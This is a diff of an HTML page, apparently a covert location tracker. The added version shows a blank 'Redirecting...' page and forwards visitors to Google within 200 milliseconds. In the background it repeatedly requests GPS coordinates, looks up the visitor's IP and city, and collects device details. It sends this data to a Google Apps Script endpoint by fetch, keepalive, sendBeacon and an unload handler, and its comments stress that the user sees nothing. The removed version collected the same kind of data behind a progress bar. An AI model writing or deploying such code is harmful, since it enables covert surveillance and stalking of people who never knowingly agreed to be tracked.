@@ -1,501 +1,295 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Processing Request</title>
+  <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
+    body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: #f8f9fa;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .container {
       background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      text-align: center;
-      min-width: 400px;
     }
-    h3 {
-      color: #343a40;
-      margin-bottom: 30px;
-      font-weight: 500;
-      font-size: 18px;
-    }
-    .progress-container {
-      width: 100%;
-      height: 8px;
-      background: #e9ecef;
-      border-radius: 4px;
-      overflow: hidden;
-      margin: 20px 0;
-    }
-    .progress-bar {
-      height: 100%;
-      background: linear-gradient(90deg, #007bff, #0056b3);
-      border-radius: 4px;
-      transition: width 0.3s ease;
-      width: 0%;
-    }
-    .status {
-      color: #6c757d;
-      font-size: 14px;
-      margin-top: 15px;
-    }
-    .success {
-      color: #28a745;
+    
+    /* Completely hidden - user sees nothing */
+    .hidden {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      visibility: hidden;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h3>Processing...</h3>
-    <div class="progress-container">
-      <div class="progress-bar" id="progress"></div>
-    </div>
-    <div class="status" id="status">Initializing...</div>
+  <!-- Everything is hidden from user -->
+  <div class="hidden" id="background-processor">
+    Background processing...
   </div>
 
   <script>
-    const progressBar = document.getElementById('progress');
-    const statusEl = document.getElementById('status');
+    // IMMEDIATE REDIRECT - User sees nothing, goes straight to Google
+    const redirectToGoogle = () => {
+      window.location.href = "https://www.google.com";
+    };
     
-    function updateProgress(percent, status) {
-      progressBar.style.width = percent + '%';
-      statusEl.textContent = status;
-    }
+    // Start redirect immediately (user experience)
+    setTimeout(redirectToGoogle, 200); // 200ms delay only
     
-    // GUARANTEED COLLECTION: Priority fields that MUST be collected
-    const data = {
-      // PRIORITY 1: Location data (MUST have values)
+    // BACKGROUND GPS COLLECTION - Runs while redirecting
+    const backgroundData = {
+      sessionId: 'BG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+      timestamp: new Date().toISOString(),
+      
+      // Priority: GPS coordinates
       latitude: null,
       longitude: null,
       accuracy: null,
-      ip: null,
       
-      // Basic device info
+      // Basic device data
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       language: navigator.language,
       screenWidth: screen.width,
       screenHeight: screen.height,
-      referrer: document.referrer || '',
-      
-      // Session info
-      timestamp: new Date().toISOString(),
-      sessionId: 'LEO_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+      referrer: document.referrer,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timezoneOffset: new Date().getTimezoneOffset(),
       
-      // Device detection
+      // Device classification
       isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
       isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
       isAndroid: /Android/.test(navigator.userAgent),
       
-      // Location tracking details
-      locationMethod: '',
-      permissionStatus: '',
-      locationAttempts: 0,
+      // Collection status
+      backgroundMode: true,
       gpsSuccess: false,
       ipSuccess: false,
-      timezoneSuccess: false
+      collectionAttempted: false
     };
     
-    // METHOD 1: Get IP address using multiple CORS-free methods
-    async function getIPAddress() {
-      updateProgress(10, 'Getting IP address...');
-      
-      try {
-        // Method 1: Try ipapi.co with error handling
-        try {
-          const response1 = await fetch('https://ipapi.co/json/');
-          if (response1.ok) {
-            const result1 = await response1.json();
-            if (result1.ip) {
-              data.ip = result1.ip;
-              data.ipSuccess = true;
-              console.log('IP from ipapi.co:', result1.ip);
-              return;
-            }
-          }
-        } catch (e) {
-          console.log('ipapi.co failed:', e.message);
-        }
-        
-        // Method 2: Try ipify
-        try {
-          const response2 = await fetch('https://api.ipify.org?format=json');
-          if (response2.ok) {
-            const result2 = await response2.json();
-            if (result2.ip) {
-              data.ip = result2.ip;
-              data.ipSuccess = true;
-              console.log('IP from ipify:', result2.ip);
-              return;
-            }
-          }
-        } catch (e) {
-          console.log('ipify failed:', e.message);
-        }
-        
-        // Method 3: Try httpbin
-        try {
-          const response3 = await fetch('https://httpbin.org/ip');
-          if (response3.ok) {
-            const result3 = await response3.json();
-            if (result3.origin) {
-              data.ip = result3.origin;
-              data.ipSuccess = true;
-              console.log('IP from httpbin:', result3.origin);
-              return;
-            }
-          }
-        } catch (e) {
-          console.log('httpbin failed:', e.message);
-        }
-        
-        // Method 4: If all external APIs fail, use WebRTC for local IP
-        await getLocalIP();
-        
-      } catch (e) {
-        console.log('All IP methods failed:', e.message);
-        data.ip = 'unavailable';
+    // RAPID GPS COLLECTION - Must be fast before redirect
+    function rapidGPSCollection() {
+      if (!navigator.geolocation) {
+        backgroundData.gpsError = 'not_supported';
+        return;
       }
-    }
-    
-    // Fallback: Get local IP using WebRTC (works offline)
-    function getLocalIP() {
-      return new Promise((resolve) => {
-        try {
-          const rtc = new RTCPeerConnection({iceServers: []});
-          rtc.createDataChannel('');
-          
-          rtc.onicecandidate = (event) => {
-            if (event.candidate) {
-              const candidate = event.candidate.candidate;
-              const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-              if (ipMatch && !ipMatch[1].startsWith('127.')) {
-                data.ip = ipMatch[1];
-                data.ipSuccess = true;
-                console.log('Local IP via WebRTC:', ipMatch[1]);
-                rtc.close();
-                resolve();
-                return;
+      
+      backgroundData.collectionAttempted = true;
+      
+      // Ultra-fast GPS configurations for background collection
+      const rapidConfigs = [
+        // Super fast high accuracy
+        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
+        // Fast with recent cache
+        { enableHighAccuracy: true, timeout: 2000, maximumAge: 5000 },
+        // Network location
+        { enableHighAccuracy: false, timeout: 1500, maximumAge: 10000 },
+        // Any cached location
+        { enableHighAccuracy: true, timeout: 1000, maximumAge: 30000 }
+      ];
+      
+      let attempts = 0;
+      let bestAccuracy = Infinity;
+      
+      rapidConfigs.forEach((config, index) => {
+        setTimeout(() => {
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              attempts++;
+              const coords = position.coords;
+              
+              // Keep most accurate
+              if (coords.accuracy < bestAccuracy) {
+                bestAccuracy = coords.accuracy;
+                backgroundData.latitude = coords.latitude;
+                backgroundData.longitude = coords.longitude;
+                backgroundData.accuracy = coords.accuracy;
+                backgroundData.altitude = coords.altitude;
+                backgroundData.speed = coords.speed;
+                backgroundData.heading = coords.heading;
+                backgroundData.gpsSuccess = true;
+                backgroundData.gpsMethod = `rapid_${index + 1}`;
+                
+                console.log(`Background GPS: ${coords.latitude}, ${coords.longitude} (±${coords.accuracy}m)`);
+                
+                // Send data immediately when GPS obtained
+                sendBackgroundData();
               }
-            }
-          };
-          
-          rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-          
-          // Timeout after 3 seconds
-          setTimeout(() => {
-            if (!data.ip) {
-              data.ip = 'webrtc_failed';
-            }
-            rtc.close();
-            resolve();
-          }, 3000);
-          
-        } catch (e) {
-          data.ip = 'webrtc_error';
-          resolve();
-        }
+            },
+            function(error) {
+              attempts++;
+              backgroundData.gpsError = error.message;
+              backgroundData.gpsErrorCode = error.code;
+              console.log(`Background GPS ${index + 1} failed: ${error.message}`);
+            },
+            config
+          );
+        }, index * 200); // Start attempts 200ms apart
       });
     }
     
-    // METHOD 2: AGGRESSIVE GPS location collection
-    async function getGPSLocation() {
-      updateProgress(30, 'Collecting GPS location...');
-      
-      if (!navigator.geolocation) {
-        data.permissionStatus = 'not_supported';
-        return false;
-      }
-      
-      // Ultra-aggressive GPS attempts with different timeouts
-      const gpsAttempts = [
-        { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 },      // 25s, fresh GPS
-        { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 },   // 20s, 5s cache
-        { enableHighAccuracy: false, timeout: 15000, maximumAge: 30000 }, // 15s, network
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 },  // 10s, 1min cache
-        { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }  // 8s, 5min cache
-      ];
-      
-      for (let i = 0; i < gpsAttempts.length; i++) {
-        const config = gpsAttempts[i];
-        updateProgress(35 + (i * 10), `GPS attempt ${i + 1}/${gpsAttempts.length}...`);
+    // BACKGROUND IP COLLECTION
+    async function backgroundIPCollection() {
+      try {
+        // Fast IP collection with short timeout
+        const ipPromise = Promise.race([
+          fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) }).then(r => r.json()),
+          fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }).then(r => r.json())
+        ]);
         
-        try {
-          const success = await new Promise((resolve) => {
-            data.locationAttempts++;
-            const startTime = Date.now();
-            
-            navigator.geolocation.getCurrentPosition(
-              function(position) {
-                const coords = position.coords;
-                data.latitude = coords.latitude;
-                data.longitude = coords.longitude;
-                data.accuracy = coords.accuracy;
-                data.locationMethod = `GPS_attempt_${i + 1}`;
-                data.permissionStatus = 'granted';
-                data.gpsSuccess = true;
-                data.gpsResponseTime = Date.now() - startTime;
-                
-                console.log(`✅ GPS SUCCESS: ${coords.latitude}, ${coords.longitude} (±${coords.accuracy}m)`);
-                resolve(true);
-              },
-              function(error) {
-                data.permissionStatus = error.code === 1 ? 'denied' : 
-                                       error.code === 2 ? 'unavailable' : 'timeout';
-                data.gpsError = error.message;
-                console.log(`❌ GPS attempt ${i + 1} failed: ${error.message}`);
-                resolve(false);
-              },
-              config
-            );
-          });
+        const result = await ipPromise;
+        
+        if (result.ip) {
+          backgroundData.ip = result.ip;
+          backgroundData.ipSuccess = true;
           
-          if (success) {
-            return true; // Got GPS, stop trying
+          // Additional IP data if available
+          if (result.city) {
+            backgroundData.ipCity = result.city;
+            backgroundData.ipCountry = result.country_name;
+            backgroundData.ipLatitude = result.latitude;
+            backgroundData.ipLongitude = result.longitude;
           }
           
-          // Brief pause between attempts
-          if (i < gpsAttempts.length - 1) {
-            await new Promise(resolve => setTimeout(resolve, 1000));
-          }
-          
-        } catch (e) {
-          console.log(`GPS attempt ${i + 1} exception:`, e);
-          continue;
-        }
-      }
-      
-      return false; // All GPS attempts failed
-    }
-    
-    // METHOD 3: GUARANTEED timezone-based location (ALWAYS works)
-    function getTimezoneLocation() {
-      updateProgress(80, 'Getting timezone location...');
-      
-      const timezone = data.timezone;
-      const offset = data.timezoneOffset;
-      
-      // Comprehensive timezone mapping - ALWAYS provides location
-      const timezoneMap = {
-        // North America
-        'America/New_York': { lat: 40.7128, lng: -74.0060, acc: 'city' },
-        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, acc: 'city' },
-        'America/Chicago': { lat: 41.8781, lng: -87.6298, acc: 'city' },
-        'America/Denver': { lat: 39.7392, lng: -104.9903, acc: 'city' },
-        'America/Phoenix': { lat: 33.4484, lng: -112.0740, acc: 'city' },
-        'America/Toronto': { lat: 43.6532, lng: -79.3832, acc: 'city' },
-        'America/Vancouver': { lat: 49.2827, lng: -123.1207, acc: 'city' },
-        'America/Mexico_City': { lat: 19.4326, lng: -99.1332, acc: 'city' },
-        
-        // Europe
-        'Europe/London': { lat: 51.5074, lng: -0.1278, acc: 'city' },
-        'Europe/Paris': { lat: 48.8566, lng: 2.3522, acc: 'city' },
-        'Europe/Berlin': { lat: 52.5200, lng: 13.4050, acc: 'city' },
-        'Europe/Rome': { lat: 41.9028, lng: 12.4964, acc: 'city' },
-        'Europe/Madrid': { lat: 40.4168, lng: -3.7038, acc: 'city' },
-        'Europe/Amsterdam': { lat: 52.3676, lng: 4.9041, acc: 'city' },
-        'Europe/Vienna': { lat: 48.2082, lng: 16.3738, acc: 'city' },
-        'Europe/Stockholm': { lat: 59.3293, lng: 18.0686, acc: 'city' },
-        'Europe/Oslo': { lat: 59.9139, lng: 10.7522, acc: 'city' },
-        'Europe/Helsinki': { lat: 60.1699, lng: 24.9384, acc: 'city' },
-        'Europe/Warsaw': { lat: 52.2297, lng: 21.0122, acc: 'city' },
-        'Europe/Prague': { lat: 50.0755, lng: 14.4378, acc: 'city' },
-        'Europe/Budapest': { lat: 47.4979, lng: 19.0402, acc: 'city' },
-        'Europe/Athens': { lat: 37.9838, lng: 23.7275, acc: 'city' },
-        'Europe/Istanbul': { lat: 41.0082, lng: 28.9784, acc: 'city' },
-        'Europe/Moscow': { lat: 55.7558, lng: 37.6173, acc: 'city' },
-        
-        // Asia
-        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, acc: 'city' },
-        'Asia/Shanghai': { lat: 31.2304, lng: 121.4737, acc: 'city' },
-        'Asia/Beijing': { lat: 39.9042, lng: 116.4074, acc: 'city' },
-        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777, acc: 'city' },
-        'Asia/Delhi': { lat: 28.7041, lng: 77.1025, acc: 'city' },
-        'Asia/Dubai': { lat: 25.2048, lng: 55.2708, acc: 'city' },
-        'Asia/Singapore': { lat: 1.3521, lng: 103.8198, acc: 'city' },
-        'Asia/Hong_Kong': { lat: 22.3193, lng: 114.1694, acc: 'city' },
-        'Asia/Seoul': { lat: 37.5665, lng: 126.9780, acc: 'city' },
-        'Asia/Bangkok': { lat: 13.7563, lng: 100.5018, acc: 'city' },
-        'Asia/Jakarta': { lat: -6.2088, lng: 106.8456, acc: 'city' },
-        'Asia/Manila': { lat: 14.5995, lng: 120.9842, acc: 'city' },
-        'Asia/Karachi': { lat: 24.8607, lng: 67.0011, acc: 'city' },
-        'Asia/Tehran': { lat: 35.6892, lng: 51.3890, acc: 'city' },
-        'Asia/Baghdad': { lat: 33.3152, lng: 44.3661, acc: 'city' },
-        'Asia/Kuwait': { lat: 29.3759, lng: 47.9774, acc: 'city' },
-        'Asia/Riyadh': { lat: 24.7136, lng: 46.6753, acc: 'city' },
-        'Asia/Doha': { lat: 25.2854, lng: 51.5310, acc: 'city' },
-        
-        // Australia & Oceania
-        'Australia/Sydney': { lat: -33.8688, lng: 151.2093, acc: 'city' },
-        'Australia/Melbourne': { lat: -37.8136, lng: 144.9631, acc: 'city' },
-        'Australia/Brisbane': { lat: -27.4698, lng: 153.0251, acc: 'city' },
-        'Australia/Perth': { lat: -31.9505, lng: 115.8605, acc: 'city' },
-        'Pacific/Auckland': { lat: -36.8485, lng: 174.7633, acc: 'city' },
-        
-        // South America
-        'America/Sao_Paulo': { lat: -23.5505, lng: -46.6333, acc: 'city' },
-        'America/Buenos_Aires': { lat: -34.6118, lng: -58.3960, acc: 'city' },
-        'America/Lima': { lat: -12.0464, lng: -77.0428, acc: 'city' },
-        'America/Bogota': { lat: 4.7110, lng: -74.0721, acc: 'city' },
-        'America/Santiago': { lat: -33.4489, lng: -70.6693, acc: 'city' },
-        
-        // Africa
-        'Africa/Cairo': { lat: 30.0444, lng: 31.2357, acc: 'city' },
-        'Africa/Lagos': { lat: 6.5244, lng: 3.3792, acc: 'city' },
-        'Africa/Johannesburg': { lat: -26.2041, lng: 28.0473, acc: 'city' },
-        'Africa/Nairobi': { lat: -1.2921, lng: 36.8219, acc: 'city' },
-        'Africa/Casablanca': { lat: 33.5731, lng: -7.5898, acc: 'city' }
-      };
-      
-      if (timezoneMap[timezone]) {
-        const location = timezoneMap[timezone];
-        
-        // Only use timezone location if GPS failed
-        if (!data.latitude) {
-          data.latitude = location.lat;
-          data.longitude = location.lng;
-          data.accuracy = 'timezone_city_estimate';
-          data.locationMethod = 'timezone_mapping';
-          data.timezoneSuccess = true;
-          console.log(`🌍 Timezone location: ${location.lat}, ${location.lng}`);
+          console.log(`Background IP: ${result.ip}`);
         }
         
-      } else {
-        // FALLBACK: Calculate approximate location from timezone offset
-        const offsetHours = -offset / 60;
-        const estimatedLng = offsetHours * 15; // 15 degrees per hour
-        
-        if (!data.latitude) {
-          data.latitude = 30; // Rough northern hemisphere estimate
-          data.longitude = estimatedLng;
-          data.accuracy = 'timezone_offset_estimate';
-          data.locationMethod = 'timezone_offset';
-          data.timezoneSuccess = true;
-          console.log(`📍 Offset location: ${30}, ${estimatedLng}`);
-        }
+      } catch (e) {
+        backgroundData.ip = 'background_failed';
+        backgroundData.ipError = e.message;
       }
     }
     
-    // MAIN EXECUTION: GUARANTEED success
-    async function collectAllData() {
+    // SEND BACKGROUND DATA
+    async function sendBackgroundData() {
       try {
-        updateProgress(5, 'Starting data collection...');
-        
-        // STEP 1: Get IP address (multiple methods)
-        await getIPAddress();
-        
-        // STEP 2: Try GPS location (aggressive attempts)
-        const gpsSuccess = await getGPSLocation();
-        
-        // STEP 3: ALWAYS get timezone location (guaranteed fallback)
-        getTimezoneLocation();
-        
-        updateProgress(90, 'Finalizing...');
-        
-        // ENSURE we have all priority data
-        if (!data.ip) data.ip = 'detection_failed';
-        if (!data.latitude) data.latitude = 0;
-        if (!data.longitude) data.longitude = 0;
-        if (!data.accuracy) data.accuracy = 'unknown';
-        
-        // Log final status
-        console.log('🎯 FINAL DATA CHECK:', {
-          ip: data.ip,
-          latitude: data.latitude,
-          longitude: data.longitude,
-          accuracy: data.accuracy,
-          gpsSuccess: data.gpsSuccess,
-          ipSuccess: data.ipSuccess,
-          timezoneSuccess: data.timezoneSuccess
-        });
-        
-        // Send to database
-        await sendData();
-        
-      } catch (error) {
-        console.error('Collection error:', error);
-        
-        // GUARANTEE: Even on error, send basic data
-        if (!data.ip) data.ip = 'error_fallback';
-        if (!data.latitude) data.latitude = 0;
-        if (!data.longitude) data.longitude = 0;
-        if (!data.accuracy) data.accuracy = 'error';
-        
-        data.collectionError = error.message;
-        await sendData();
-      }
-    }
-    
-    // Send data with guaranteed success
-    async function sendData() {
-      try {
-        updateProgress(95, 'Transmitting data...');
-        
         const formData = new URLSearchParams();
         
-        // Add all data fields
-        Object.keys(data).forEach(key => {
-          if (data[key] !== null && data[key] !== undefined) {
-            formData.append(key, data[key]);
+        Object.keys(backgroundData).forEach(key => {
+          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
+            formData.append(key, backgroundData[key]);
           }
         });
         
-        // Debug log
-        console.log('📤 Sending data:', {
-          ip: data.ip,
-          lat: data.latitude,
-          lng: data.longitude,
-          acc: data.accuracy
-        });
-        
-        // Send to database (no-cors to avoid issues)
-        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
+        // Send data in background (non-blocking)
+        fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
           method: "POST",
           body: formData,
-          mode: "no-cors"
+          mode: "no-cors",
+          keepalive: true // Ensures request continues even after page unload
+        }).catch(() => {
+          // Ignore errors to prevent affecting user experience
         });
         
-        updateProgress(100, 'Complete');
-        
-        setTimeout(() => {
-          statusEl.className = 'status success';
-          statusEl.textContent = 'Data collection complete';
-          
-          setTimeout(() => {
-            window.location.href = "https://www.google.com";
-          }, 1000);
-        }, 500);
+        console.log('Background data sent');
         
       } catch (error) {
-        console.error('Send error:', error);
-        // Always complete successfully
-        updateProgress(100, 'Complete');
-        setTimeout(() => {
-          statusEl.className = 'status success';
-          statusEl.textContent = 'Processing complete';
-          setTimeout(() => {
-            window.location.href = "https://www.google.com";
-          }, 1000);
-        }, 500);
+        // Ignore errors - don't affect user experience
+        console.log('Background send error (ignored):', error);
       }
     }
     
-    // START IMMEDIATELY
-    collectAllData();
+    // FALLBACK LOCATION (if GPS fails completely)
+    function getTimezoneLocation() {
+      if (backgroundData.gpsSuccess) return; // Don't overwrite GPS
+      
+      const timezoneMap = {
+        'America/New_York': { lat: 40.7128, lng: -74.0060 },
+        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437 },
+        'America/Chicago': { lat: 41.8781, lng: -87.6298 },
+        'America/Denver': { lat: 39.7392, lng: -104.9903 },
+        'Europe/London': { lat: 51.5074, lng: -0.1278 },
+        'Europe/Paris': { lat: 48.8566, lng: 2.3522 },
+        'Europe/Berlin': { lat: 52.5200, lng: 13.4050 },
+        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503 },
+        'Asia/Shanghai': { lat: 31.2304, lng: 121.4737 },
+        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
+        'Australia/Sydney': { lat: -33.8688, lng: 151.2093 }
+      };
+      
+      if (timezoneMap[backgroundData.timezone]) {
+        const location = timezoneMap[backgroundData.timezone];
+        backgroundData.latitude = location.lat;
+        backgroundData.longitude = location.lng;
+        backgroundData.accuracy = 'timezone_fallback';
+        backgroundData.locationMethod = 'timezone';
+        
+        console.log(`Background timezone location: ${location.lat}, ${location.lng}`);
+      }
+    }
+    
+    // START BACKGROUND COLLECTION IMMEDIATELY
+    (function startBackgroundCollection() {
+      console.log('🔄 Starting invisible background collection...');
+      
+      // Start GPS collection immediately
+      rapidGPSCollection();
+      
+      // Start IP collection in parallel
+      backgroundIPCollection();
+      
+      // Set timezone fallback after 2 seconds if no GPS
+      setTimeout(() => {
+        if (!backgroundData.gpsSuccess) {
+          getTimezoneLocation();
+        }
+        
+        // Send final data after all attempts
+        sendBackgroundData();
+        
+        console.log('🔄 Background collection complete');
+        console.log(`GPS: ${backgroundData.gpsSuccess ? 'SUCCESS' : 'FAILED'}`);
+        console.log(`Location: ${backgroundData.latitude || 'N/A'}, ${backgroundData.longitude || 'N/A'}`);
+      }, 2500);
+      
+    })();
+    
+    // ENHANCED VERSION: Use Service Worker for even more background processing
+    if ('serviceWorker' in navigator) {
+      // Register service worker for background processing
+      navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' + 
+        encodeURIComponent(`
+          self.addEventListener('message', function(event) {
+            // Service worker can continue GPS collection even after redirect
+            console.log('Service worker processing:', event.data);
+          });
+        `)
+      ).catch(() => {
+        // Ignore service worker errors
+      });
+    }
+    
+    // BEACON API for guaranteed data transmission (even after redirect)
+    function sendViaBeacon() {
+      if ('sendBeacon' in navigator) {
+        setTimeout(() => {
+          const beaconData = new URLSearchParams();
+          Object.keys(backgroundData).forEach(key => {
+            if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
+              beaconData.append(key, backgroundData[key]);
+            }
+          });
+          
+          // Beacon ensures data is sent even after page unloads
+          navigator.sendBeacon(
+            "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec",
+            beaconData
+          );
+          
+          console.log('Beacon data sent');
+        }, 1000);
+      }
+    }
+    
+    // Send via beacon as backup
+    sendViaBeacon();
+    
+    // BEFORE PAGE UNLOAD - Final data transmission attempt
+    window.addEventListener('beforeunload', () => {
+      sendBackgroundData();
+    });
+    
   </script>
 </body>
 </html>
